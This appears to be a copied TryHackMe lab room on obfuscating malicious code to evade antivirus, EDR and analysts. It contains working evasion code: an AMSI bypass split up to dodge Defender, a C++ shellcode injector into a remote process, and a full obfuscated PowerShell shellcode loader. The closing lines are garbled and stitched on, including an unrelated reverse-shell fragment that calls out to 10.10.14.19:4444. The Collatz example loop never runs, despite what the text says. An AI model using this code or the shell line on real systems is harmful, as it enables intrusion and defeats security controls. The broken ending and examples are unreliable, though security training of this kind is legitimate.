## Table of Contents

  - [Object Concatenation](#Object\Concatenation)
  - [Obfuscations Function For Analysis Deception](#Obfuscations\Function\For\Analysis\Deception)
- [Arbitrary Control Flow Patterns](#arbitrary\control\flow\patterns)
    - [Object Names](#Object\Names)
    - [Code Structure](#Code\Structure)
    - [File & Compilation Properties](#File\&\Compilation\Properties)


Machine IP: `MACHINE_IP`             Username: `Student`             Password: `TryHackMe!`


Obfuscation is widely used in many software-related fields to protect **IP** (**I**ntellectual **P**roperty) and other proprietary information an application may contain.

For example, the popular game: Minecraft uses the obfuscator [ProGuard](https://github.com/Guardsquare/proguard) to obfuscate and minimize its Java classes. Minecraft also releases **obfuscation maps** with limited information as a translator between the old un-obfuscated classes and the new obfuscated classes to support the modding community.

This is only one example of the wide range of ways obfuscation is publicly used. To document and organize the variety of obfuscation methods, we can reference the [Layered obfuscation: a taxonomy of software obfuscation techniques for layered security paper](https://cybersecurity.springeropen.com/track/pdf/10.1186/s42400-020-00049-3.pdf). This research paper organizes obfuscation methods by **layers**, similar to the OSI model but for application data flow. Below is the figure used as the complete overview of each taxonomy layer.
![Diagram showing the four layers of the layered obfuscation taxonomy: Code-Element Layer, Software-Component Layer, Inter-Component Layer, and Application layer](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/54c0a2415cd4fc88a55b154bf297910c.png)





Each sub layer is then broken down into specific methods that can achiece the overall objective if the sub-layer.


![Diagram showing sub-layers of the Code-Element Layer: Obfuscating Layout, Obfuscating Controls, Obfuscating Data, Obfuscating Methods, and Obfuscating Classes](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/974cf87ce312e0885e6e8027f9c1821e.png)
To use the taxonomy, we can determine an objective and then pick a method that fits our requirements. For example, suppose we want to obfuscate the layout of our code but cannot modify the existing code. In that case, we can inject junk code, summarized by the taxonomy:

`Code Element Layer` > `Obfuscating Layout` > `Junk Codes`.

But how could this be used maliciously? Adversaries and malware developers can leverage obfuscation to break signatures or prevent program analysis. In the upcoming tasks, we will discuss both perspectives of malware obfuscation, including the purpose and underlying techniques of each.
Two of the more considerable security boundaries in the way of an adversary are **anti-virus engines** and **EDR** (**E**ndpoint **D**etection & **R**esponse) solutions. As covered in the [Introduction to Anti-virus room](https://tryhackme.com/room/introtoav), both platforms will leverage an extensive database of known signatures referred to as **static** signatures as well as **heuristic** signatures that consider application behavior.

To evade signatures, adversaries can leverage an extensive range of logic and syntax rules to implement obfuscation. This is commonly achieved by abusing data obfuscation practices that hide important identifiable information in legitimate applications.

The aforementioned white paper: [Layered Obfuscation Taxonomy](https://cybersecurity.springeropen.com/articles/10.1186/s42400-020-00049-3), summarizes these practices well under the **code-element** layer. Below is a table of methods covered by the taxonomy in the **obfuscating data** sub-layer**.**

![Diagram showing the objectives of the Obfuscating Data Sub-Layer: Array Transformation, Data Encoding, Data Procedurization, and Data Splitting/Merging](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/dacc392986614d70d6dc982111077063.png)

|   |   |
|---|---|
|**Obfuscation Method**|**Purpose**|
|Array Transformation|Transforms an array by splitting, merging, folding, and flattening|
|Data Encoding|Encodes data with mathematical functions or ciphers|
|Data Procedurization|Substitutes static data with procedure calls|
|Data Splitting/Merging|Distributes information of one variable into several new variables|

In the upcoming tasks, we will primarily focus on **data splitting/merging**; because static signatures are weaker, we generally only need to focus on that one aspect in initial obfuscation.

Check out the Encoding/Packing/Binder/Crypters room for more information about **data encoding,** and the [Signature Evasion room](https://tryhackme.com/room/signatureevasion) for more information about **data procedurization** and **transformation**.


## Object Concatenation
**Concatenation** is a common programming concept that combines two separate objects into one object, such as a string.

A pre-defined operator defines where the concatenation will occur to combine two independent objects. Below is a generic example of string concatenation in Python.
```python
>>> A = "Hello "
>>> B = "THM"
>>> C = A + B
>>> print(C)
Hello THM
>>>
```

Depending on the language used in a program, there may be different or multiple pre-defined operators than can be used for concatenation. Below is a small table of common languages and their corresponding pre-defined operators.

|   |   |
|---|---|
|**Language  <br>**|**Concatenation Operator**|
|Python|“**+**”|
|PowerShell|“**+**”, ”**,**”, ”**$**”, or no operator at all|
|C#|“**+**”, “**String.Join**”, “**String.Concat**”|
|C|“**strcat**”|
|C++|“**+**”, “**append**”|
The aforementioned white paper: [Layered Obfuscation Taxonomy](https://cybersecurity.springeropen.com/articles/10.1186/s42400-020-00049-3), summarizes these practices well under the **code-element** layer’s **data splitting/merging** sub-layer.

---

What does this mean for attackers? Concatenation can open the doors to several vectors to modify signatures or manipulate other aspects of an application. The most common example of concatenation being used in malware is breaking targeted **static signatures**, as covered in the [Signature Evasion room](https://tryhackme.com/room/signatureevasion). Attackers can also use it preemptively to break up all objects of a program and attempt to remove all signatures at once without hunting them down, commonly seen in obfuscators as covered in task 9.

Below we will observe a static **Yara** rule and attempt to use concatenation to evade the static signature.
```powershell
rule ExampleRule
{
    strings:
        $text_string = "AmsiScanBuffer"
        $hex_string = { B8 57 00 07 80 C3 }

    condition:
        $my_text_string or $my_hex_string
}
```

When a compiled binary is scanned with Yara, it will create a positive alert/detection if the defined string is present. Using concatenation, the string can be functionally the same but will appear as two independent string when scanned, resulting in no alerts.
```powershell
IntPtr ASBPtr = GetProcAddress(TargetDLL, "AmsiScanBuffer"); 
```

```powershell
IntPtr ASBPtr = GetProcAddress(TargetDLL, "Amsi" + "Scan" + "Buffer"); 
```
If the second code block were to be scanned with the Yara rule, there would be no alerts!

---

Extending from concatenation, attackers can also use **non-interpreted characters** to disrupt or confuse a static signature. These can be used independently or with concatenation, depending on the strength/implementation of the signature. Below is a table of some common non-interpreted characters that we can leverage.

|   |   |   |
|---|---|---|
|**Character  <br>**|**Purpose  <br>**|**Example**|
|Breaks|Break a single string into multiple sub strings and combine them|`('co'+'ffe'+'e')`|
|Reorders|Reorder a string’s components|`('{1}{0}'-f'ffee','co')`|
|Whitespace|Include white space that is not interpreted|`.( 'Ne' +'w-Ob' + 'ject')`|
|Ticks|Include ticks that are not interpreted|``d`own`LoAd`Stri`ng``|
|Random Case|Tokens are generally not case sensitive and can be any arbitrary case|`dOwnLoAdsTRing`|

```powershell
[Ref].Assembly.GetType('System.Management.Automation.'+'Amsi'+'Utils').GetField('amsiInitFailed','NonPublic,Static')
```

Now this snippet may be harder to track down…. With some prior knowledge of PowerShell we can assume that `NonPublic` and `Static` are both pretty standard and would not contribute to the signature. We can assume `amsiInitFailed` is what Defender is alerting on and attempt to split it.
```powershell
PS M:\\> [Ref].Assembly.GetType('System.Management.Automation.'+'Amsi'+'Utils').GetField('amsi'+'Init'+'Failed','No'+'nPublic,S'+'tatic')
```
```powershell
PS M:\\> [Ref].Assembly.GetType('System.Management.Automation.'+'Amsi'+'Utils').GetField('amsi'+'Init'+'Failed','No'+'nPublic,S'+'tatic').SetValue($null,$true)
```

This is interesting, there doesn’t seem to be any parameter values that would contribute to this alert? This must mean that Defender is alerting on the presence of each cmdlet together to determine it is a malicious snippet. To solve this problem we need to separate the cmdlet(s) from the rest of the snippet. This technique is known as separation of related code and is often seen along with concatenation, we will cover this concept further in task 8.

```powershell
PS M:\\> $Value="SetValue"
PS M:\\> [Ref].Assembly.GetType('System.Management.Automation.'+'Amsi'+'Utils').GetField('amsi'+'Init'+'Failed','No'+'nPublic,S'+'tatic').$Value($null,$true)
PS M:\\>
```



## Obfuscations Function For Analysis Deception


After obfuscating basic functions of malicious code, it may be able to pass software detections but is still susceptible to human analysis. While not a security boundary without further policies, analysts and reverse engineers can gain deep insight into the functionality of our malicious application and halt operations. Adversaries can leverage advanced logic and math to create more complex and harder to understand code to combat analaysis and reverse engineering

For more information about reverse engineering, check out the [Malware Analysis module](https://tryhackme.com/module/malware-analysis).

The aforementioned white paper: [Layered Obfuscation Taxonomy](https://cybersecurity.springeropen.com/articles/10.1186/s42400-020-00049-3), summarizes these practices well under other sub-layers of the **code-element layer**. Below is a table of methods covered by the taxonomy in the **obfuscating layout** and **obfuscating controls sub-layers**.

![Diagram showing the objectives of the Obfuscating Layer sub-layer: junk codes, separation of related codes, stripping redundant symbols, and meaningless identifiers](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/f9e4be87a9801b500d118e2c83e19c01.png)  

|   |   |
|---|---|
|**Obfuscation Method  <br>**|**Purpose**|
|Junk Code|Add junk instructions that are non-functional, also known as a code stubs|
|Separation of Related Code|Separate related codes or instructions to increase difficulty in reading the program|
|Stripping Redundant Symbols|Strips symbolic information such as debug information or other symbol tables|
|Meaningless Identifiers|Transform a meaningful identifier to something meaningless|
|Implicit Controls|Converts explicit controls instructions to implicit instructions|
|Dispatcher-based Controls|Determines the next block to be executed during the runtime|
|Probabilistic Control Flows|Introduces replications of control flows with the same semantics but different syntax|
|Bogus Control Flows|Control flows deliberately added to a program but will never be executed|

|   |   |
|---|---|
|**Logic Statement  <br>**|**Purpose**|
|if/else|Executes only if a condition is met, else it will execute a different code block|
|try/catch|Will try to execute a code block and catch it if it fails to handle errors.|
|switch case|A switch will follow similar conditional logic to an if statement but checks several different possible conditions with cases before resolving to a break or default|
|for/while loop|A for loop will execute for a set amount of a condition. A while loop will execute until a condition is no longer met.|
To make this concept concrete, we can observe an example function and its corresponding **CFG** (**C**ontrol **F**low **G**raph) to depict it’s possible control flow paths.

```python
x = 10 
if(x > 7):
	print("This executes")
else:
	print("This is ignored")
```

![Control flow diagram showing two different logical paths](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/cfc2504b9a4a76682d724413080e3729.png)



# Arbitrary Control Flow Patterns
nject a different control flow into a malicious function.

We can leverage **predicates** to craft these complex logic and/or mathematical algorithms. Predicates refer to the decision-making of an input function to return **true** or **false**. Breaking this concept down at a high level, we can think of a predicate similar to the condition an if statement uses to determine if a code block will be executed or not, as seen in the example in the previous task.

Applying this concept to obfuscation, **opaque predicates** are used to control a known output and input. The paper, [Opaque Predicate: Attack and Defense in Obfuscated Binary Code](https://etda.libraries.psu.edu/files/final_submissions/17513), states, “An opaque predicate is a predicate whose value is known to the obfuscator but is difficult to deduce. It can be seamlessly applied with other obfuscation methods such as junk code to turn reverse engineering attempts into arduous work.” Opaque predicates fall under the **bogus control flow** and **probabilistic control flow** methods of the taxonomy paper; they can be used to arbitrarily add logic to a program or refactor the control flow of a pre-existing function.

The topic of opaque predicates requires a deeper understanding of mathematics and computing principles, so we will not cover it in-depth, but we will observe one common example.

![Control flow diagram showing the various logical paths of the collatz conjecture](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/c1a1b8196a13becaa1efec050260c81b.png)

The **Collatz Conjecture** is a common mathematical problem that can be used as an example of an opaque predicate. It states: If two arithmetic operations are repeated, they will return one from every positive integer. The fact that we know it will always output one for a known input (a positive integer) means it is a viable opaque predicate. For more information about the Collatz conjecture, refer to the [Collatz Problem](https://mathworld.wolfram.com/CollatzProblem.html). Below is an example of the Collatz conjecture applied in Python.

```python
x = 0
while(x > 1):
	if(x%2==1):
		x=x*3+1
	else:
		x=x/2
	if(x==1):
		print("hello!") 
```

In the above code snippet, the Collatz conjecture will only perform its mathematical operations if `x > 1`, resulting in `1` or `TRUE`. From the definition of the Collatz problem, it will always return one for a positive integer input, so the statement will always return true if `x` is a positive integer greater than one.

To prove the efficacy of this opaque predicate, we can observe its **CFG** (**C**ontrol **F**low **G**raph) to the right. If this is what an interpreted function looks like, just imagine what a compiled function may look like to an analyst.

﻿Identifiable information can be one of the most critical components an analyst can use to dissect and attempt to understand a malicious program. By limiting the amount of identifiable information (variables, function names, etc.), an analyst has, the better chance an attacker has they won't be able to reconstruct its original function.

At a high level, we should consider three different types of identifiable data: code structure, object names, and file/compilation properties. In this task, we will break down the core concepts of each and a case study of a practical approach to each.

---

### Object Names

Object names offer some of the most significant insight into a program's functionality and can reveal the exact purpose of a function. An analyst can still deconstruct the purpose of a function from its behavior, but this is much harder if there is no context to the function.

The importance of literal object names may change depending on if the language is **compiled**  or **interpreted**. If an interpreted language such as **Python** or **PowerShell** is used, then all objects matter and must be modified. If a compiled language such as **C** or **C#** is used, only objects appearing in the strings are generally significant. An object may appear in the strings by any function that produces an **IO operation**.

The aforementioned white paper: [Layered Obfuscation Taxonomy](https://cybersecurity.springeropen.com/articles/10.1186/s42400-020-00049-3), summarizes these practices well under the **code-element** layer’s **meaningless identifiers** method.

Below we will observe two basic examples of replacing meaningful identifiers for both an interpreted and compiled language.

---

As an example of a compiled language, we can observe a process injector written in C++ that reports its status to the command line.

```c
#include "windows.h"
#include <iostream>
#include <string>
using namespace std;

int main(int argc, char* argv[])
{
	unsigned char shellcode[] = "";

	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;
	string leaked = "This was leaked in the strings";

	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
	cout << "Handle obtained for" << processHandle;
	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	cout << "Buffer Created";
	WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
	cout << "Process written with buffer" << remoteBuffer;
	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	CloseHandle(processHandle);
	cout << "Closing handle" << processHandle;
	cout << leaked;

	return 0;
}
```
Let’s use strings to see exactly what was leaked when this source code is compiled.

```powershell
C:\>.\strings.exe "\Injector.exe"

Strings v2.54 - Search for ANSI and Unicode strings in binary images.
Copyright (C) 1999-2021 Mark Russinovich
Sysinternals - www.sysinternals.com

!This program cannot be run in DOS mode.
>FU
z';
z';
...
[snip]
...
Y_^[
leaked
shellcode
2_^[]
...
[snip]
...
std::_Adjust_manually_vector_aligned
"invalid argument"
string too long
This was leaked in the strings
Handle obtained for
Buffer Created
Process written with buffer
Closing handle
std::_Allocate_manually_vector_aligned
bad allocation
Stack around the variable '
...
[snip]
...
8@9H9T9X9\\9h9|9
:$:(:D:H:
@1p1
```

Notice that all of the iostream was written to strings, and even the shellcode byte array was leaked. This is a smaller program, so imagine what a fleshed-out and un-obfuscated program would look like!

We can remove comments and replace the meaningful identifiers to resolve this problem.

```c
#include "windows.h"

int main(int argc, char* argv[])
{
	unsigned char awoler[] = "";

	HANDLE awerfu;
	HANDLE rwfhbf;
	PVOID iauwef;

	awerfu = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
	iauwef = VirtualAllocEx(awerfu, NULL, sizeof awoler, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(awerfu, iauwef, awoler, sizeof awoler, NULL);
	rwfhbf = CreateRemoteThread(awerfu, NULL, 0, (LPTHREAD_START_ROUTINE)iauwef, NULL, 0, NULL);
	CloseHandle(awerfu);

	return 0;
}
```


We should no longer have any identifiable string information, and the program is safe from string analysis.

---

As an example for an interpreted language we can observe the deprecated [Badger PowerShell loader](https://github.com/paranoidninja/Brute-Ratel-C4-Community-Kit/blob/main/deprecated/badger_template.ps1) from the [BRC4 Community Kit](https://github.com/paranoidninja/Brute-Ratel-C4-Community-Kit).

```powershell
Set-StrictMode -Version 2
[Byte[]] $Ait1m = @(0x3d, 0x50, 0x51, 0x57, 0x50, 0x4e, 0x5f, 0x50, 0x4f, 0x2f, 0x50, 0x57, 0x50, 0x52, 0x4c, 0x5f, 0x50)
[Byte[]] $ahv3I = @(0x34, 0x59, 0x38, 0x50, 0x58, 0x5a, 0x5d, 0x64, 0x38, 0x5a, 0x4f, 0x60, 0x57, 0x50)
[Byte[]] $Moo5y = @(0x38, 0x64, 0x2f, 0x50, 0x57, 0x50, 0x52, 0x4c, 0x5f, 0x50, 0x3f, 0x64, 0x5b, 0x50)
[Byte[]] $ooR5o = @(0x2e, 0x57, 0x4c, 0x5e, 0x5e, 0x17, 0x0b, 0x3b, 0x60, 0x4d, 0x57, 0x54, 0x4e, 0x17, 0x0b, 0x3e, 0x50, 0x4c, 0x57, 0x50, 0x4f, 0x17, 0x0b, 0x2c, 0x59, 0x5e, 0x54, 0x2e, 0x57, 0x4c, 0x5e, 0x5e, 0x17, 0x0b, 0x2c, 0x60, 0x5f, 0x5a, 0x2e, 0x57, 0x4c, 0x5e, 0x5e)
[Byte[]] $Reo5o = @(0x3d, 0x60, 0x59, 0x5f, 0x54, 0x58, 0x50, 0x17, 0x0b, 0x38, 0x4c, 0x59, 0x4c, 0x52, 0x50, 0x4f)
[Byte[]] $Reib3 = @(0x3d, 0x3f, 0x3e, 0x5b, 0x50, 0x4e, 0x54, 0x4c, 0x57, 0x39, 0x4c, 0x58, 0x50, 0x17, 0x0b, 0x33, 0x54, 0x4f, 0x50, 0x2d, 0x64, 0x3e, 0x54, 0x52, 0x17, 0x0b, 0x3b, 0x60, 0x4d, 0x57, 0x54, 0x4e)
[Byte[]] $Thah8 = @(0x3b, 0x60, 0x4d, 0x57, 0x54, 0x4e, 0x17, 0x0b, 0x33, 0x54, 0x4f, 0x50, 0x2d, 0x64, 0x3e, 0x54, 0x52, 0x17, 0x0b, 0x39, 0x50, 0x62, 0x3e, 0x57, 0x5a, 0x5f, 0x17, 0x0b, 0x41, 0x54, 0x5d, 0x5f, 0x60, 0x4c, 0x57)
[Byte[]] $ii5Ie = @(0x34, 0x59, 0x61, 0x5a, 0x56, 0x50)
[Byte[]] $KooG5 = @(0x38, 0x54, 0x4e, 0x5d, 0x5a, 0x5e, 0x5a, 0x51, 0x5f, 0x19, 0x42, 0x54, 0x59, 0x1e, 0x1d, 0x19, 0x40, 0x59, 0x5e, 0x4c, 0x51, 0x50, 0x39, 0x4c, 0x5f, 0x54, 0x61, 0x50, 0x38, 0x50, 0x5f, 0x53, 0x5a, 0x4f, 0x5e)
[Byte[]] $io9iH = @(0x32, 0x50, 0x5f, 0x3b, 0x5d, 0x5a, 0x4e, 0x2c, 0x4f, 0x4f, 0x5d, 0x50, 0x5e, 0x5e)
[Byte[]] $Qui5i = @(0x32, 0x50, 0x5f, 0x38, 0x5a, 0x4f, 0x60, 0x57, 0x50, 0x33, 0x4c, 0x59, 0x4f, 0x57, 0x50)
[Byte[]] $xee2N = @(0x56, 0x50, 0x5d, 0x59, 0x50, 0x57, 0x1e, 0x1d)
[Byte[]] $AD0Pi = @(0x41, 0x54, 0x5d, 0x5f, 0x60, 0x4c, 0x57, 0x2c, 0x57, 0x57, 0x5a, 0x4e)
[Byte[]] $ahb3O = @(0x41, 0x54, 0x5d, 0x5f, 0x60, 0x4c, 0x57, 0x3b, 0x5d, 0x5a, 0x5f, 0x50, 0x4e, 0x5f)
[Byte[]] $yhe4c = @(0x2E, 0x5D, 0x50, 0x4C, 0x5F, 0x50, 0x3F, 0x53, 0x5D, 0x50, 0x4C, 0x4F)

function Get-Robf ($b3tz) {
    $aisN = [System.Byte[]]::new($b3tz.Count)
    for ($x = 0; $x -lt $aisN.Count; $x++) {
       $aisN[$x] = ($b3tz[$x] + 21)
    }
    return [System.Text.Encoding]::ASCII.GetString($aisN)
}
function Get-PA ($vmod, $vproc) {
    $a = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }).GetType((Get-Robf $KooG5))
    return ($a.GetMethod((Get-Robf $io9iH), [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null)).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($a.GetMethod((Get-Robf $Qui5i))).Invoke($null, @($vmod)))), $vproc))
}
function Get-TDef {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
        [Parameter(Position = 1)] [Type] $var_return_type = [Void]
    )
    $vtdef = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName((Get-Robf $Ait1m))), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule((Get-Robf  $ahv3I), $false).DefineType((Get-Robf $Moo5y), (Get-Robf $ooR5o), [System.MulticastDelegate])
    $vtdef.DefineConstructor((Get-Robf $Reib3), [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags((Get-Robf $Reo5o))
    $vtdef.DefineMethod((Get-Robf $ii5Ie), (Get-Robf $Thah8), $var_return_type, $var_parameters).SetImplementationFlags((Get-Robf $Reo5o))
    return $vtdef.CreateType()
}

[Byte[]]$vopcode = @(BADGER_SHELLCODE)

$vbuf = ([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-PA (Get-Robf $xee2N) (Get-Robf $AD0Pi)), (Get-TDef @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))).Invoke([IntPtr]::Zero, $vopcode.Length, 0x3000, 0x04)
[System.Runtime.InteropServices.Marshal]::Copy($vopcode, 0x0, $vbuf, $vopcode.length)
([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-PA (Get-Robf $xee2N) (Get-Robf $ahb3O)), (Get-TDef @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))).Invoke($vbuf, $vopcode.Length, 0x20, [ref](0)) | Out-Null
([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-PA (Get-Robf $xee2N) (Get-Robf $yhe4c)), (Get-TDef @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([UInt32])))).Invoke(0, 0, $vbuf, [IntPtr]0, 0, [ref](0)) | Out-Null
```


You may notice that some cmdlets and functions are kept in their original state… why is that? Depending on your objectives, you may want to create an application that can still confuse reverse engineers after detection but may not look immediately suspicious. If a malware developer were to obfuscate all cmdlets and functions, it would raise the entropy in both interpreted and compiled languages resulting in higher EDR alert scores. It could also lead to an interpreted snippet appearing suspicious in logs if it is seemingly random or visibly heavily obfuscated.

### Code Structure
Code structure can be a bothersome problem when dealing with all aspects of malicious code that are often overlooked and not easily identified. If not adequately addressed in both interpreted and compiled languages, it can lead to signatures or easier reverse engineering from an analyst.

As covered in the aforementioned taxonomy paper, **junk code** and **reordering code** are both widely used as additional measures to add complexity to an interpreted program. Because the program is not compiled, an analyst has much greater insight into the program, and if not artificially inflated with complexity, they can focus on the exact malicious functions of an application.

Separation of related code can impact both interpreted and compiled languages and result in hidden signatures that may be hard to identify. A heuristic signature engine may determine whether a program is malicious based on the surrounding functions or API calls. To circumvent these signatures, an attacker can randomize the occurrence of related code to fool the engine into believing it is a safe call or function.


### File & Compilation Properties

More minor aspects of a compiled binary, such as the compilation method, may not seem like a critical component, but they can lead to several advantages to assist an analyst. For example, if a program is compiled as a debug build, an analyst can obtain all the available global variables and other program information.

The compiler will include a symbol file when a program is compiled as a debug build. Symbols commonly aid in debugging a binary image and can contain global and local variables, function names, and entry points. Attackers must be aware of these possible problems to ensure proper compilation practices and that no information is leaked to an analyst.

Luckily for attackers, symbol files are easily removed through the compiler or after compilation. To remove symbols from a compiler like **Visual Studio**, we need to change the compilation target from `Debug` to `Release` or use a lighter-weight compiler like **mingw.**

If we need to remove symbols from a pre-compiled image, we can use the command-line utility: `strip`.

The aforementioned white paper: [Layered Obfuscation Taxonomy](https://cybersecurity.springeropen.com/articles/10.1186/s42400-020-00049-3), summarizes these practices well under the **code-element** layer’s **stripping redundant symbols** method.

Below is an example of using strip to remove the symbols from a binary compiled in **gcc** with debugging enabled.

nm cmdshell.exe
strip --strip-all cmdshell.exe
bm cmdshell.exe
exit
(Ubuntu)
python3 enc.py --chain "& /dev/tcp/10.10.14.19/4444 0>&1'\"); ?>"


























































